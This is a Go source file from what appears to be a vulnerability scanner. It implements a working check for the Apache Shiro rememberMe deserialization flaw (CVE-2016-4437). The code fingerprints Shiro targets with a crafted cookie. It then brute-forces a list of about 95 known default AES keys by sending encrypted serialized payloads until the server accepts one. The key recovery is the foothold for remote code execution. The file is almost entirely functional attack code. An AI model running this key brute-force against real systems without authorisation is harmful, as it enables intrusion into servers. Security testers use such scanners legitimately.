package scripts

import (
	"Gopo/utils"
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"github.com/jweny/xhttp"
	"net/http"
	"strings"
	"sync"
)

const pocName3 = "shiro550-cve-2016-4437"

type shiroTask struct {
	target string
	key    string
}

var base64SimplePrincipalCollection = "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA=="

func shiro(target string) {
	var wg sync.WaitGroup
	var tasks []shiroTask
	//探测是否为shiro框架
	hr, _ := http.NewRequest("GET", target, nil)
	shiroreq := &xhttp.Request{}
	shiroreq.RawRequest = hr
	shiroreq.SetHeader("Cookie", "rememberMe=Theoyu")
	ctx := context.Background()
	oResp, err := utils.Client.Do(ctx, shiroreq)
	if err != nil {
		utils.Error(err)
		return
	}
	if strings.Contains(oResp.GetHeaders().Get("Set-Cookie"), "rememberMe=deleteMe") == false {
		return
	}
	utils.Info("find Shiro!")
	taskChan := make(chan shiroTask, threads)
	for _, key := range shiroKeys {
		task := shiroTask{
			key:    key,
			target: target,
		}
		tasks = append(tasks, task)
	}

	worker := func(taskChan chan shiroTask, wg *sync.WaitGroup) {
		for task := range taskChan {
			shiroExecPoc(task)
			wg.Done()
		}
	}
	for i := 0; i < threads; i++ {
		go worker(taskChan, &wg)
	}

	for _, task := range tasks {
		taskChan <- task
		wg.Add(1)
	}
	wg.Wait()
}

func shiroExecPoc(task shiroTask) {
	target := task.target
	key := task.key
	utils.Debug("try key: " + key)
	hr, _ := http.NewRequest("GET", target, nil)
	shiroreq := &xhttp.Request{}
	shiroreq.RawRequest = hr
	shiroreq.SetHeader("Cookie", "rememberMe="+aesEncode(key))
	oResp, err := utils.Client.Do(nil, shiroreq)
	if err != nil {
		utils.Error(err)
		return
	}
	if strings.Contains(oResp.GetHeaders().Get("Set-Cookie"), "rememberMe=deleteMe") == false {
		utils.Green("%v %v find,key =%v ", target, pocName3, key)
	}

}

func aesEncode(key string) string {
	SimplePrincipalCollection, _ := base64.StdEncoding.DecodeString(base64SimplePrincipalCollection)
	BytesKey, _ := base64.StdEncoding.DecodeString(key)
	iv := []byte(utils.RandLetters(16))
	block, _ := aes.NewCipher(BytesKey)
	mode := cipher.NewCBCEncrypter(block, iv)

	content := padding(SimplePrincipalCollection, aes.BlockSize)

	ciphertext := make([]byte, aes.BlockSize+len(content))
	mode.CryptBlocks(ciphertext[aes.BlockSize:], content)
	copy(ciphertext, iv)
	return base64.StdEncoding.EncodeToString(ciphertext)
}

func padding(plainText []byte, blockSize int) []byte {
	n := blockSize - len(plainText)%blockSize
	temp := bytes.Repeat([]byte{byte(n)}, n)
	plainText = append(plainText, temp...)
	return plainText
}

//var shiroreq = &xhttp.Request{}

var shiroKeys = []string{
	"Z3VucwAAAAAAAAAAAAAAAA==",
	"fCq+/xW488hMTCD+cmJ3aQ==",
	"4AvVhmFLUs0KTA3Kprsdag==",
	"kPH+bIxk5D2deZiIxcaaaA==",
	"0AvVhmFLUs0KTA3Kprsdag==",
	"1AvVhdsgUs0FSA3SDFAdag==",
	"1QWLxg+NYmxraMoxAXu/Iw==",
	"25BsmdYwjnfcWmnhAciDDg==",
	"2AvVhdsgUs0FSA3SDFAdag==",
	"3AvVhmFLUs0KTA3Kprsdag==",
	"3JvYhmBLUs0ETA5Kprsdag==",
	"r0e3c16IdVkouZgk1TKVMg==",
	"5aaC5qKm5oqA5pyvAAAAAA==",
	"5AvVhmFLUs0KTA3Kprsdag==",
	"6AvVhmFLUs0KTA3Kprsdag==",
	"6NfXkC7YVCV5DASIrEm1Rg==",
	"6ZmI6I2j5Y+R5aSn5ZOlAA==",
	"cmVtZW1iZXJNZQAAAAAAAA==",
	"7AvVhmFLUs0KTA3Kprsdag==",
	"8AvVhmFLUs0KTA3Kprsdag==",
	"8BvVhmFLUs0KTA3Kprsdag==",
	"9AvVhmFLUs0KTA3Kprsdag==",
	"OUHYQzxQ/W9e/UjiAGu6rg==",
	"a3dvbmcAAAAAAAAAAAAAAA==",
	"aU1pcmFjbGVpTWlyYWNsZQ==",
	"bWljcm9zAAAAAAAAAAAAAA==",
	"bWluZS1hc3NldC1rZXk6QQ==",
	"bXRvbnMAAAAAAAAAAAAAAA==",
	"ZUdsaGJuSmxibVI2ZHc9PQ==",
	"wGiHplamyXlVB11UXWol8g==",
	"U3ByaW5nQmxhZGUAAAAAAA==",
	"MTIzNDU2Nzg5MGFiY2RlZg==",
	"L7RioUULEFhRyxM7a2R/Yg==",
	"a2VlcE9uR29pbmdBbmRGaQ==",
	"WcfHGU25gNnTxTlmJMeSpw==",
	"OY//C4rhfwNxCQAQCrQQ1Q==",
	"5J7bIJIV0LQSN3c9LPitBQ==",
	"f/SY5TIve5WWzT4aQlABJA==",
	"bya2HkYo57u6fWh5theAWw==",
	"WuB+y2gcHRnY2Lg9+Aqmqg==",
	"kPv59vyqzj00x11LXJZTjJ2UHW48jzHN",
	"3qDVdLawoIr1xFd6ietnwg==",
	"YI1+nBV//m7ELrIyDHm6DQ==",
	"6Zm+6I2j5Y+R5aS+5ZOlAA==",
	"2A2V+RFLUs+eTA3Kpr+dag==",
	"6ZmI6I2j3Y+R1aSn5BOlAA==",
	"SkZpbmFsQmxhZGUAAAAAAA==",
	"2cVtiE83c4lIrELJwKGJUw==",
	"fsHspZw/92PrS3XrPW+vxw==",
	"XTx6CKLo/SdSgub+OPHSrw==",
	"sHdIjUN6tzhl8xZMG3ULCQ==",
	"O4pdf+7e+mZe8NyxMTPJmQ==",
	"HWrBltGvEZc14h9VpMvZWw==",
	"rPNqM6uKFCyaL10AK51UkQ==",
	"Y1JxNSPXVwMkyvES/kJGeQ==",
	"lT2UvDUmQwewm6mMoiw4Ig==",
	"MPdCMZ9urzEA50JDlDYYDg==",
	"xVmmoltfpb8tTceuT5R7Bw==",
	"c+3hFGPjbgzGdrC+MHgoRQ==",
	"ClLk69oNcA3m+s0jIMIkpg==",
	"Bf7MfkNR0axGGptozrebag==",
	"1tC/xrDYs8ey+sa3emtiYw==",
	"ZmFsYWRvLnh5ei5zaGlybw==",
	"cGhyYWNrY3RmREUhfiMkZA==",
	"IduElDUpDDXE677ZkhhKnQ==",
	"yeAAo1E8BOeAYfBlm4NG9Q==",
	"cGljYXMAAAAAAAAAAAAAAA==",
	"2itfW92XazYRi5ltW0M2yA==",
	"XgGkgqGqYrix9lI6vxcrRw==",
	"ertVhmFLUs0KTA3Kprsdag==",
	"5AvVhmFLUS0ATA4Kprsdag==",
	"s0KTA3mFLUprK4AvVhsdag==",
	"hBlzKg78ajaZuTE0VLzDDg==",
	"9FvVhtFLUs0KnA3Kprsdyg==",
	"d2ViUmVtZW1iZXJNZUtleQ==",
	"yNeUgSzL/CfiWw1GALg6Ag==",
	"NGk/3cQ6F5/UNPRh8LpMIg==",
	"4BvVhmFLUs0KTA3Kprsdag==",
	"MzVeSkYyWTI2OFVLZjRzZg==",
	"empodDEyMwAAAAAAAAAAAA==",
	"A7UzJgh1+EWj5oBFi+mSgw==",
	"c2hpcm9fYmF0aXMzMgAAAA==",
	"i45FVt72K2kLgvFrJtoZRw==",
	"U3BAbW5nQmxhZGUAAAAAAA==",
	"ZnJlc2h6Y24xMjM0NTY3OA==",
	"Jt3C93kMR9D5e8QzwfsiMw==",
	"MTIzNDU2NzgxMjM0NTY3OA==",
	"vXP33AonIp9bFwGl7aT7rA==",
	"V2hhdCBUaGUgSGVsbAAAAA==",
	"Q01TX0JGTFlLRVlfMjAxOQ==",
	"ZAvph3dsQs0FSL3SDFAdag==",
	"Is9zJ3pzNh2cgTHB4ua3+Q==",
	"NsZXjXVklWPZwOfkvk6kUA==",
	"GAevYnznvgNCURavBhCr1w==",
	"66v1O8keKNV3TTcGPK1wzg==",
	"SDKOLKn2J1j/2BHjeZwAoQ==",
}

func init() {
	scriptRegister(pocName3, shiro)
}
